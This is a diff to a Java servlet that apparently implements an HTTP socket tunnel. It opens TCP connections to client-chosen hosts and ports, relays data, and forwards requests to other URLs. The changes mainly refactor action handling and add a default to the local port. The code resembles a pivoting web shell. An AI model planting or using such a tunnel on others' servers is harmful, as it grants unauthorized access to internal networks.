@@ -213,8 +213,7 @@
 
         private void processDataBio(HttpServletRequest request, HttpServletResponse resp) throws Exception {
             final InputStream reqInputStream = request.getInputStream();
-            HashMap dataMap;
-            dataMap = unmarshal(reqInputStream);
+            HashMap dataMap = unmarshal(reqInputStream);
 
             byte[] action = (byte[]) dataMap.get("ac");
             if (action.length != 1 || action[0] != 0x00) {
@@ -226,10 +225,13 @@
 
             // 0x00 create socket
             resp.setHeader("X-Accel-Buffering", "no");
-            String host = new String((byte[]) dataMap.get("h"));
-            int port = Integer.parseInt(new String((byte[]) dataMap.get("p")));
             Socket sc;
             try {
+                String host = new String((byte[]) dataMap.get("h"));
+                int port = Integer.parseInt(new String((byte[]) dataMap.get("p")));
+                if (port == 0) {
+                    port = request.getLocalPort();
+                }
                 sc = new Socket();
                 sc.connect(new InetSocketAddress(host, port), 5000);
             } catch (Exception e) {
@@ -284,20 +286,21 @@
                 HashMap dataMap;
                 dataMap = unmarshal(bufInputStream);
 
-                byte[] action = (byte[]) dataMap.get("ac");
-                if (action.length != 1) {
+                byte[] actions = (byte[]) dataMap.get("ac");
+                if (actions.length != 1) {
                     return;
                 }
-                if (action[0] == 0x02) {
+                byte action = actions[0];
+                if (action == 0x02) {
                     socketOutStream.close();
                     return;
-                } else if (action[0] == 0x01) {
+                } else if (action == 0x01) {
                     byte[] data = (byte[]) dataMap.get("dt");
                     if (data.length != 0) {
                         socketOutStream.write(data);
                         socketOutStream.flush();
                     }
-                } else if (action[0] == 0x03) {
+                } else if (action == 0x03) {
                     continue;
                 } else {
                     return;
@@ -314,8 +317,8 @@
 
 
             String clientId = new String((byte[]) dataMap.get("id"));
-            byte[] action = (byte[]) dataMap.get("ac");
-            if (action.length != 1) {
+            byte[] actions = (byte[]) dataMap.get("ac");
+            if (actions.length != 1) {
                 resp.setStatus(403);
                 return;
             }
@@ -325,6 +328,7 @@
                 ActionDelete    byte = 0x02
                 ActionHeartbeat byte = 0x03
              */
+            byte action = actions[0];
             byte[] redirectData = (byte[]) dataMap.get("r");
             boolean needRedirect = redirectData != null && redirectData.length > 0;
             String redirectUrl = "";
@@ -335,7 +339,7 @@
             }
             // load balance, send request with data to request url
             // action 0x00 need to pipe, see below
-            if (needRedirect && action[0] >= 0x01 && action[0] <= 0x03) {
+            if (needRedirect && action >= 0x01 && action <= 0x03) {
                 HttpURLConnection conn = redirect(request, dataMap, redirectUrl);
                 conn.disconnect();
                 return;
@@ -343,13 +347,13 @@
 
             resp.setBufferSize(512);
             OutputStream respOutStream = resp.getOutputStream();
-            if (action[0] == 0x02) {
+            if (action == 0x02) {
                 Object o = this.get(clientId);
                 if (o == null) return;
                 OutputStream scOutStream = (OutputStream) o;
                 scOutStream.close();
                 return;
-            } else if (action[0] == 0x01) {
+            } else if (action == 0x01) {
                 Object o = this.get(clientId);
                 if (o == null) {
                     respOutStream.write(marshal(newDel()));
@@ -368,13 +372,16 @@
             } else {
             }
 
-            if (action[0] != 0x00) {
+            if (action != 0x00) {
                 return;
             }
             // 0x00 create new tunnel
             resp.setHeader("X-Accel-Buffering", "no");
             String host = new String((byte[]) dataMap.get("h"));
             int port = Integer.parseInt(new String((byte[]) dataMap.get("p")));
+            if (port == 0) {
+                port = request.getLocalPort();
+            }
 
             InputStream readFrom;
             Socket sc = null;
